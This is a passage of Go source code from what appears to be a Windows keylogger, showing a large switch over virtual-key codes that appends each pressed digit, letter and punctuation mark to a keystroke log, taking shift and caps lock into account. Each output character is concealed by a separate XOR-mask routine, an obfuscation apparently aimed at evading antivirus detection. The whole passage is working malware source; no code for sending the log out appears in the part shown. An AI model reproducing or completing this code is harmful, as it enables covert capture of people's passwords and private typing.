maskedStr := []byte("\x89")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_3:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x6e")
maskedStr := []byte("\x10")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xad")
maskedStr := []byte("\xcd")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_4:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xde")
maskedStr := []byte("\xa5")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xf7")
maskedStr := []byte("\xac")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_5:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x94")
maskedStr := []byte("\xe8")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x78")
maskedStr := []byte("\x24")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_6:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xf5")
maskedStr := []byte("\x88")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xb5")
maskedStr := []byte("\xe8")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_7:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x7d")
maskedStr := []byte("\x5f")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x24")
maskedStr := []byte("\x03")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_PERIOD:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xb2")
maskedStr := []byte("\x8c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x9c")
maskedStr := []byte("\xb2")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x30:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xc4")
maskedStr := []byte("\xed")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x5e")
maskedStr := []byte("\x6e")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x31:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xa5")
maskedStr := []byte("\x84")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xe2")
maskedStr := []byte("\xd3")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x32:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xf6")
maskedStr := []byte("\xb6")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x2d")
maskedStr := []byte("\x1f")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x33:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x5c")
maskedStr := []byte("\x7f")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x7d")
maskedStr := []byte("\x4e")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x34:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x8d")
maskedStr := []byte("\xa9")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x32")
maskedStr := []byte("\x06")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x35:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x47")
maskedStr := []byte("\x62")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x4a")
maskedStr := []byte("\x7f")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x36:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xc6")
maskedStr := []byte("\x98")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x51")
maskedStr := []byte("\x67")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x37:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xba")
maskedStr := []byte("\x9c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x66")
maskedStr := []byte("\x51")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x38:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x80")
maskedStr := []byte("\xaa")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xa4")
maskedStr := []byte("\x9c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x39:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xf9")
maskedStr := []byte("\xd1")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x22")
maskedStr := []byte("\x1b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x41:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xf0")
maskedStr := []byte("\xb1")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x3e")
maskedStr := []byte("\x5f")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x42:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x51")
maskedStr := []byte("\x13")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x09")
maskedStr := []byte("\x6b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x43:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xad")
maskedStr := []byte("\xee")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x1e")
maskedStr := []byte("\x7d")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x44:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x26")
maskedStr := []byte("\x62")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x1e")
maskedStr := []byte("\x7a")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x45:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xc5")
maskedStr := []byte("\x80")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x0c")
maskedStr := []byte("\x69")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x46:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x2a")
maskedStr := []byte("\x6c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xfa")
maskedStr := []byte("\x9c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x47:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x7a")
maskedStr := []byte("\x3d")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xdc")
maskedStr := []byte("\xbb")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x48:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x8a")
maskedStr := []byte("\xc2")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x6f")
maskedStr := []byte("\x07")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x49:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xf2")
maskedStr := []byte("\xbb")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x3c")
maskedStr := []byte("\x55")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x4A:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x0a")
maskedStr := []byte("\x40")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xd4")
maskedStr := []byte("\xbe")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x4B:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xab")
maskedStr := []byte("\xe0")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x25")
maskedStr := []byte("\x4e")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x4C:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x1f")
maskedStr := []byte("\x53")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xfd")
maskedStr := []byte("\x91")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x4D:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x1a")
maskedStr := []byte("\x57")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xc1")
maskedStr := []byte("\xac")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x4E:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x9e")
maskedStr := []byte("\xd0")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x35")
maskedStr := []byte("\x5b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x4F:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x8d")
maskedStr := []byte("\xc2")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x8a")
maskedStr := []byte("\xe5")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x50:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xaa")
maskedStr := []byte("\xfa")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x05")
maskedStr := []byte("\x75")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x51:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xda")
maskedStr := []byte("\x8b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x97")
maskedStr := []byte("\xe6")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x52:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xe3")
maskedStr := []byte("\xb1")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x48")
maskedStr := []byte("\x3a")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x53:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xfe")
maskedStr := []byte("\xad")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xa6")
maskedStr := []byte("\xd5")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x54:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xf4")
maskedStr := []byte("\xa0")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x8a")
maskedStr := []byte("\xfe")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x55:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x37")
maskedStr := []byte("\x62")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x90")
maskedStr := []byte("\xe5")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x56:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xba")
maskedStr := []byte("\xec")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xb8")
maskedStr := []byte("\xce")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x57:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xb3")
maskedStr := []byte("\xe4")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xe9")
maskedStr := []byte("\x9e")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x58:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\xca")
maskedStr := []byte("\x92")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xec")
maskedStr := []byte("\x94")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x59:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x4e")
maskedStr := []byte("\x17")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x75")
maskedStr := []byte("\x0c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case 0x5A:
					if caps || shift {
						tmpKeylog += (func() string {
mask := []byte("\x90")
maskedStr := []byte("\xca")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xd4")
maskedStr := []byte("\xae")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				}
			}
		}
	}
}
